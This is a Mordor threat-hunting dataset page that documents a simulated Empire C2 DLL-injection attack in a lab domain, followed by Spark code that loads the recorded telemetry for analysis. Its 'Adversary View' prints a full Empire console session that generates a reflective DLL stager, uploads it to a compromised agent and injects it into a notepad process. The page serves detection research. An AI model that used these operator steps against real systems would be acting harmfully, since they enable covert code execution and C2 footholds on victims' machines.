# Empire DLL Injection

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWWIN-190518221344 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2020/07/22 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/code_execution/Invoke-DllInjection.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_dll_injection_CreateRemoteThread.zip |

## Dataset Description
This dataset represents a threat actor injects a Dll into an arbitrary process

## Adversary View
```
(Empire) > usestager windows/dll
(Empire: stager/windows/dll) > 
(Empire: stager/windows/dll) > set Listener http
(Empire: stager/windows/dll) > info

Name: DLL Launcher

Description:
  Generate a PowerPick Reflective DLL to inject with
  stager code.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True        http              Listener to use.
  Language         True        powershell        Language of the stager to generate.
  Arch             True        x64               Architecture of the .dll to generate
                                                (x64 or x86).
  StagerRetries    False       0                 Times for the stager to retry
                                                connecting.
  UserAgent        False       default           User-agent string to use for the staging
                                                request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                or other).
  ProxyCreds       False       default           Proxy credentials
                                                ([domain\]username:password) to use for
                                                request (default, none, or other).
  OutFile          True        /tmp/launcher.dll File to output dll to.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                powershell code, uses the
                                                ObfuscateCommand for obfuscation types.
                                                For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                Only used if Obfuscate switch is True.
                                                For powershell only.


(Empire: stager/windows/dll) > execute

[*] Stager output written out to: /tmp/launcher.dll

(Empire: stager/windows/dll) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\pgustavo        powershell         9076   5/0.0    2020-07-22 03:52:58  http            

(Empire: agents) > interact 712ETU3B
(Empire: 712ETU3B) > 
(Empire: 712ETU3B) > usemodule code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > info

              Name: Invoke-DllInjection
            Module: powershell/code_execution/invoke_dllinjection
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation

Description:
  Uses PowerSploit's Invoke-DLLInjection to inject  a Dll into
  the process ID of your choosing.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Co
  deExecution/Invoke-DllInjection.ps1

Options:

  Name      Required    Value                     Description
  ----      --------    -------                   -----------
  Agent     True        712ETU3B                  Agent to run module on.                 
  ProcessID True                                  Process ID of the process you want to   
                                                  inject a Dll into.                      
  Dll       True                                  Name of the dll to inject. This can be  
                                                  an absolute or relative path.           

(Empire: powershell/code_execution/invoke_dllinjection) > set Dll launcher.dll
(Empire: powershell/code_execution/invoke_dllinjection) > back
(Empire: 712ETU3B) > ps
[*] Tasked 712ETU3B to run TASK_SHELL
[*] Agent 712ETU3B tasked with task ID 1
(Empire: 712ETU3B) > upload /tmp/launcher.dll
[*] Tasked agent to upload launcher.dll, 155 KB
[*] Tasked 712ETU3B to run TASK_UPLOAD
[*] Agent 712ETU3B tasked with task ID 2
(Empire: 712ETU3B) >
ProcessName                                                      PID Arch UserName                     MemUsage 
-----------                                                      --- ---- --------                     -------- 
Idle                                                               0 x64  N/A                          0.01 MB  
System                                                             4 x64  N/A                          0.14 MB  
Registry                                                          88 x64  NT AUTHORITY\SYSTEM          59.03 MB 
svchost                                                          396 x64  NT AUTHORITY\SYSTEM          8.43 MB  
smss                                                             408 x64  NT AUTHORITY\SYSTEM          1.10 MB  
LogonUI                                                          456 x64  NT AUTHORITY\SYSTEM          47.74 MB 
csrss                                                            524 x64  NT AUTHORITY\SYSTEM          4.66 MB  
wininit                                                          596 x64  NT AUTHORITY\SYSTEM          6.04 MB  
csrss                                                            604 x64  NT AUTHORITY\SYSTEM          3.95 MB  
winlogon                                                         664 x64  NT AUTHORITY\SYSTEM          9.32 MB  
csrss                                                            716 x64  NT AUTHORITY\SYSTEM          5.08 MB  
services                                                         732 x64  NT AUTHORITY\SYSTEM          12.67 MB 
lsass                                                            740 x64  NT AUTHORITY\SYSTEM          21.21 MB 
dwm                                                              796 x64  Window Manager\DWM-1         36.96 MB 
ctfmon                                                           808 x64  MORDOR\pgustavo              13.93 MB 
svchost                                                          856 x64  NT AUTHORITY\SYSTEM          3.58 MB  
fontdrvhost                                                      880 x64  Font Driver Host\UMFD-1      2.18 MB  
fontdrvhost                                                      884 x64  Font Driver Host\UMFD-0      2.22 MB  
svchost                                                          920 x64  NT AUTHORITY\SYSTEM          28.34 MB 
svchost                                                          996 x64  NT AUTHORITY\NETWORK SERVICE 14.50 MB 
svchost                                                         1056 x64  NT AUTHORITY\NETWORK SERVICE 67.65 MB 
svchost                                                         1096 x64  NT AUTHORITY\SYSTEM          6.86 MB  
svchost                                                         1120 x64  NT AUTHORITY\SYSTEM          9.29 MB  
svchost                                                         1164 x64  NT AUTHORITY\LOCAL SERVICE   6.02 MB  
svchost                                                         1176 x64  NT AUTHORITY\LOCAL SERVICE   6.60 MB  
svchost                                                         1184 x64  NT AUTHORITY\LOCAL SERVICE   11.45 MB 
svchost                                                         1192 x64  NT AUTHORITY\LOCAL SERVICE   5.42 MB  
browser_broker                                                  1220 x64  MORDOR\pgustavo              10.18 MB 
backgroundTaskHost                                              1296 x64  MORDOR\pgustavo              16.88 MB 
svchost                                                         1304 x64  NT AUTHORITY\SYSTEM          14.52 MB 
svchost                                                         1356 x64  NT AUTHORITY\LOCAL SERVICE   6.06 MB  
svchost                                                         1392 x64  NT AUTHORITY\LOCAL SERVICE   27.38 MB 
svchost                                                         1408 x64  NT AUTHORITY\NETWORK SERVICE 7.54 MB  
svchost                                                         1436 x64  NT AUTHORITY\SYSTEM          10.04 MB 
svchost                                                         1444 x64  NT AUTHORITY\SYSTEM          5.67 MB  
SecurityHealthSystray                                           1468 x64  MORDOR\pgustavo              11.66 MB 
svchost                                                         1488 x64  NT AUTHORITY\SYSTEM          5.47 MB  
svchost                                                         1496 x64  NT AUTHORITY\SYSTEM          6.18 MB  
svchost                                                         1504 x64  NT AUTHORITY\SYSTEM          6.77 MB  
svchost                                                         1532 x64  NT AUTHORITY\LOCAL SERVICE   7.59 MB  
svchost                                                         1544 x64  NT AUTHORITY\LOCAL SERVICE   5.32 MB  
svchost                                                         1740 x64  NT AUTHORITY\NETWORK SERVICE 11.28 MB 
svchost                                                         1764 x64  NT AUTHORITY\LOCAL SERVICE   16.14 MB 
svchost                                                         1868 x64  NT AUTHORITY\LOCAL SERVICE   17.68 MB 
VSSVC                                                           1936 x64  NT AUTHORITY\SYSTEM          7.02 MB  
svchost                                                         1960 x64  NT AUTHORITY\SYSTEM          13.24 MB 
svchost                                                         1968 x64  NT AUTHORITY\LOCAL SERVICE   7.03 MB  
svchost                                                         1980 x64  NT AUTHORITY\SYSTEM          47.10 MB 
svchost                                                         1992 x64  NT AUTHORITY\SYSTEM          5.35 MB  
RuntimeBroker                                                   2068 x64  MORDOR\pgustavo              21.71 MB 
Memory Compression                                              2104 x64  NT AUTHORITY\SYSTEM          98.54 MB 
svchost                                                         2188 x64  NT AUTHORITY\SYSTEM          9.24 MB  
backgroundTaskHost                                              2196 x64  MORDOR\pgustavo              38.76 MB 
svchost                                                         2208 x64  NT AUTHORITY\SYSTEM          7.00 MB  
SgrmBroker                                                      2252 x64  NT AUTHORITY\SYSTEM          5.88 MB  
spoolsv                                                         2260 x64  NT AUTHORITY\SYSTEM          14.19 MB 
svchost                                                         2264 x64  NT AUTHORITY\SYSTEM          9.81 MB  
svchost                                                         2296 x64  NT AUTHORITY\SYSTEM          7.45 MB  
svchost                                                         2316 x64  NT AUTHORITY\LOCAL SERVICE   7.14 MB  
svchost                                                         2372 x64  NT AUTHORITY\SYSTEM          6.17 MB  
svchost                                                         2484 x64  NT AUTHORITY\LOCAL SERVICE   6.16 MB  
RuntimeBroker                                                   2540 x64  MORDOR\pgustavo              28.75 MB 
svchost                                                         2548 x64  NT AUTHORITY\LOCAL SERVICE   6.89 MB  
smartscreen                                                     2568 x64  MORDOR\pgustavo              27.85 MB 
svchost                                                         2592 x64  NT AUTHORITY\SYSTEM          19.99 MB 
svchost                                                         2608 x64  NT AUTHORITY\NETWORK SERVICE 8.35 MB  
svchost                                                         2644 x64  NT AUTHORITY\SYSTEM          10.73 MB 
svchost                                                         2676 x64  NT AUTHORITY\LOCAL SERVICE   13.55 MB 
WaSecAgentProv                                                  2760 x64  NT AUTHORITY\SYSTEM          5.63 MB  
svchost                                                         2776 x64  NT AUTHORITY\SYSTEM          9.90 MB  
svchost                                                         2812 x64  NT AUTHORITY\LOCAL SERVICE   5.57 MB  
svchost                                                         2820 x64  NT AUTHORITY\SYSTEM          11.99 MB 
svchost                                                         2828 x64  NT AUTHORITY\LOCAL SERVICE   8.51 MB  
svchost                                                         2920 x64  NT AUTHORITY\SYSTEM          11.50 MB 
sihost                                                          3104 x64  MORDOR\pgustavo              27.69 MB 
svchost                                                         3256 x64  NT AUTHORITY\NETWORK SERVICE 12.81 MB 
svchost                                                         3268 x64  NT AUTHORITY\SYSTEM          24.27 MB 
svchost                                                         3284 x64  NT AUTHORITY\LOCAL SERVICE   33.89 MB 
svchost                                                         3344 x64  NT AUTHORITY\SYSTEM          5.10 MB  
svchost                                                         3372 x64  NT AUTHORITY\LOCAL SERVICE   6.68 MB  
ShellExperienceHost                                             3384 x64  MORDOR\pgustavo              50.26 MB 
svchost                                                         3440 x64  NT AUTHORITY\SYSTEM          15.84 MB 
WindowsAzureGuestAgent                                          3468 x64  NT AUTHORITY\SYSTEM          59.33 MB 
WaAppAgent                                                      3476 x64  NT AUTHORITY\SYSTEM          73.09 MB 
WindowsAzureNetAgent                                            3544 x64  NT AUTHORITY\SYSTEM          7.45 MB  
svchost                                                         3564 x64  NT AUTHORITY\LOCAL SERVICE   4.78 MB  
NetworkWatcherAgent                                             3580 x64  NT AUTHORITY\SYSTEM          12.99 MB 
svchost                                                         3624 x64  NT AUTHORITY\SYSTEM          8.15 MB  
svchost                                                         3648 x64  NT AUTHORITY\SYSTEM          12.23 MB 
svchost                                                         4240 x64  NT AUTHORITY\SYSTEM          19.69 MB 
WUDFHost                                                        4276 x64  NT AUTHORITY\LOCAL SERVICE   29.04 MB 
SearchIndexer                                                   4296 x64  NT AUTHORITY\SYSTEM          33.70 MB 
conhost                                                         4304 x64  MORDOR\pgustavo              15.58 MB 
taskhostw                                                       4432 x64  NT AUTHORITY\SYSTEM          36.85 MB 
svchost                                                         4440 x64  NT AUTHORITY\SYSTEM          9.48 MB  
svchost                                                         4616 x64  MORDOR\pgustavo              16.36 MB 
svchost                                                         4628 x64  NT AUTHORITY\SYSTEM          8.93 MB  
svchost                                                         4640 x64  NT AUTHORITY\SYSTEM          19.45 MB 
svchost                                                         4796 x64  NT AUTHORITY\LOCAL SERVICE   9.97 MB  
conhost                                                         4856 x64  MORDOR\pgustavo              15.93 MB 
svchost                                                         4900 x64  NT AUTHORITY\SYSTEM          7.45 MB  
StartMenuExperienceHost                                         5024 x64  MORDOR\pgustavo              61.98 MB 
svchost                                                         5064 x64  NT AUTHORITY\LOCAL SERVICE   9.70 MB  
svchost                                                         5080 x64  NT AUTHORITY\SYSTEM          7.20 MB  
svchost                                                         5148 x64  NT AUTHORITY\NETWORK SERVICE 18.23 MB 
svchost                                                         5464 x64  MORDOR\pgustavo              21.27 MB 
MicrosoftEdge                                                   5516 x64  MORDOR\pgustavo              65.12 MB 
svchost                                                         5524 x64  NT AUTHORITY\LOCAL SERVICE   6.69 MB  
svchost                                                         5548 x64  NT AUTHORITY\SYSTEM          18.43 MB 
RuntimeBroker                                                   5596 x64  MORDOR\pgustavo              48.75 MB 
svchost                                                         5640 x64  NT AUTHORITY\SYSTEM          6.71 MB  
svchost                                                         5648 x64  NT AUTHORITY\SYSTEM          8.14 MB  
svchost                                                         5704 x64  NT AUTHORITY\SYSTEM          5.90 MB  
svchost                                                         5812 x64  NT AUTHORITY\LOCAL SERVICE   6.93 MB  
dllhost                                                         5976 x64  MORDOR\pgustavo              15.26 MB 
svchost                                                         6008 x64  NT AUTHORITY\LOCAL SERVICE   8.91 MB  
svchost                                                         6036 x64  NT AUTHORITY\LOCAL SERVICE   6.32 MB  
svchost                                                         6072 x64  MORDOR\pgustavo              33.20 MB 
RuntimeBroker                                                   6152 x64  MORDOR\pgustavo              24.96 MB 
TrustedInstaller                                                6280 x64  NT AUTHORITY\SYSTEM          6.59 MB  
svchost                                                         6368 x64  NT AUTHORITY\SYSTEM          9.77 MB  
svchost                                                         6488 x64  NT AUTHORITY\SYSTEM          11.64 MB 
notepad                                                         6536 x64  MORDOR\pgustavo              15.43 MB 
SecurityHealthHost                                              6540 x64  MORDOR\pgustavo              15.52 MB 
fontdrvhost                                                     6652 x64  Font Driver Host\UMFD-3      6.01 MB  
WindowsInternal.ComposableShell.Experiences.TextInput.InputApp  6680 x64  MORDOR\pgustavo              34.32 MB 
MicrosoftEdgeCP                                                 6744 x64  MORDOR\pgustavo              51.89 MB 
WmiPrvSE                                                        6904 x64  NT AUTHORITY\NETWORK SERVICE 10.39 MB 
Microsoft.Photos                                                7044 x64  MORDOR\pgustavo              34.66 MB 
dllhost                                                         7084 x64  MORDOR\pgustavo              7.86 MB  
conhost                                                         7136 x64  NT AUTHORITY\SYSTEM          5.40 MB  
dwm                                                             7348 x64  Window Manager\DWM-3         83.22 MB 
RuntimeBroker                                                   7468 x64  MORDOR\pgustavo              24.92 MB 
Windows.WARP.JITService                                         7620 x64  NT AUTHORITY\LOCAL SERVICE   5.05 MB  
winlogon                                                        8012 x64  NT AUTHORITY\SYSTEM          8.22 MB  
MsMpEng                                                         8272 x64  NT AUTHORITY\SYSTEM          102.83 MB
svchost                                                         8328 x64  NT AUTHORITY\LOCAL SERVICE   8.31 MB  
RuntimeBroker                                                   8392 x64  MORDOR\pgustavo              20.96 MB 
svchost                                                         8408 x64  MORDOR\pgustavo              30.12 MB 
Windows.WARP.JITService                                         8416 x64  NT AUTHORITY\LOCAL SERVICE   5.21 MB  
svchost                                                         8480 x64  NT AUTHORITY\SYSTEM          5.68 MB  
ApplicationFrameHost                                            8484 x64  MORDOR\pgustavo              28.34 MB 
explorer                                                        8532 x64  MORDOR\pgustavo              117.59 MB
WUDFHost                                                        8600 x64  NT AUTHORITY\LOCAL SERVICE   4.83 MB  
powershell                                                      8648 x64  MORDOR\pgustavo              73.75 MB 
MicrosoftEdgeSH                                                 8880 x64  MORDOR\pgustavo              15.34 MB 
powershell                                                      9076 x64  MORDOR\pgustavo              121.03 MB
rdpclip                                                         9128 x64  MORDOR\pgustavo              10.55 MB 
taskhostw                                                       9236 x64  MORDOR\pgustavo              16.99 MB 
SearchUI                                                        9328 x64  MORDOR\pgustavo              211.37 MB
Sysmon                                                          9368 x64  NT AUTHORITY\SYSTEM          17.81 MB 
svchost                                                         9560 x64  NT AUTHORITY\SYSTEM          10.84 MB 
SecurityHealthService                                           9640 x64  NT AUTHORITY\SYSTEM          16.16 MB 
RuntimeBroker                                                   9768 x64  MORDOR\pgustavo              30.12 MB 
svchost                                                         9860 x64  NT AUTHORITY\SYSTEM          5.57 MB  
unsecapp                                                        9996 x64  NT AUTHORITY\SYSTEM          6.41 MB  
TiWorker                                                       10084 x64  NT AUTHORITY\SYSTEM          27.34 MB 
svchost                                                        10164 x64  NT AUTHORITY\SYSTEM          10.19 MB

(Empire: 712ETU3B) > usemodule code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > set ProcessID 6536
(Empire: powershell/code_execution/invoke_dllinjection) > info

              Name: Invoke-DllInjection
            Module: powershell/code_execution/invoke_dllinjection
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation

Description:
  Uses PowerSploit's Invoke-DLLInjection to inject  a Dll into
  the process ID of your choosing.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Co
  deExecution/Invoke-DllInjection.ps1

Options:

  Name      Required    Value                     Description
  ----      --------    -------                   -----------
  Agent     True        712ETU3B                  Agent to run module on.                 
  ProcessID True        6536                      Process ID of the process you want to   
                                                  inject a Dll into.                      
  Dll       True        launcher.dll              Name of the dll to inject. This can be  
                                                  an absolute or relative path.           

(Empire: powershell/code_execution/invoke_dllinjection) > execute
[*] Tasked 712ETU3B to run TASK_CMD_WAIT
[*] Agent 712ETU3B tasked with task ID 6
[*] Tasked agent 712ETU3B to run module powershell/code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) > 
System.Diagnostics.ProcessModule (launcher.dll)

(Empire: powershell/code_execution/invoke_dllinjection) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_dll_injection_CreateRemoteThread.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        